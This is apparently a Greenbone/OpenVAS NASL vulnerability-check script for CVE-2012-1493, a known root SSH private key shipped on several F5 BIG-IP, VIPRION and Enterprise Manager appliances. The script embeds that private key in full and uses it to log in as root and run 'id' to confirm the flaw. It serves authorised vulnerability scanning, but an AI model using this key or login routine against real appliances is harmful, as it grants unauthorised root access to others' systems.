# Copyright (C) 2012 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103494");
  script_version("2022-12-05T10:11:03+0000");
  script_cve_id("CVE-2012-1493");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2012-06-14 13:35:33 +0200 (Thu, 14 Jun 2012)");
  script_name("Multiple F5 Networks Products - SSH vulnerability CVE-2012-1493");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("ssh_detect.nasl", "gb_default_credentials_options.nasl");
  script_require_ports("Services/ssh", 22);
  script_mandatory_keys("ssh/server_banner/available");
  script_exclude_keys("default_credentials/disable_default_account_checks");

  script_xref(name:"URL", value:"https://www.trustmatta.com/advisories/MATTA-2012-002.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53897");
  script_xref(name:"URL", value:"https://support.f5.com/csp/article/K13600");

  script_tag(name:"summary", value:"Multiple F5 Networks products are prone to an SSH vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to login via SSH as the root user with a known SSH
  private key.");

  script_tag(name:"insight", value:"A platform-specific remote root access vulnerability has been
  discovered that may allow a remote user to gain privileged access to affected systems using SSH

  The vulnerability is caused by a publicly known SSH private key for the root user which is present
  on all vulnerable appliances.");

  script_tag(name:"affected", value:"The following platforms are affected by this issue:

  VIPRION B2100, B4100, and B4200

  BIG-IP 520, 540, 1000, 2000, 2400, 5000, 5100, 1600, 3600, 3900, 6900, 8900, 8950, 11000, and 11050

  BIG-IP Virtual Edition

  Enterprise Manager 3000 and 4000");

  script_tag(name:"solution", value:"Updates are available. See the References for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

if(get_kb_item("default_credentials/disable_default_account_checks"))
  exit(0);

include("ssh_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = ssh_get_port(default:22);

if(ssh_dont_try_login(port:port))
  exit(0);

if(!soc = open_sock_tcp(port))
  exit(0);

login = "root";

priv ='-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----';

login = ssh_login(socket:soc, login:login, password:NULL, priv:priv, passphrase:NULL);
if(login == 0) {
  cmd = ssh_cmd(socket:soc, cmd:"id");
  if("uid=" >< cmd) {
    security_message(port:port);
    close(soc);
    exit(0);
  }
}

close(soc);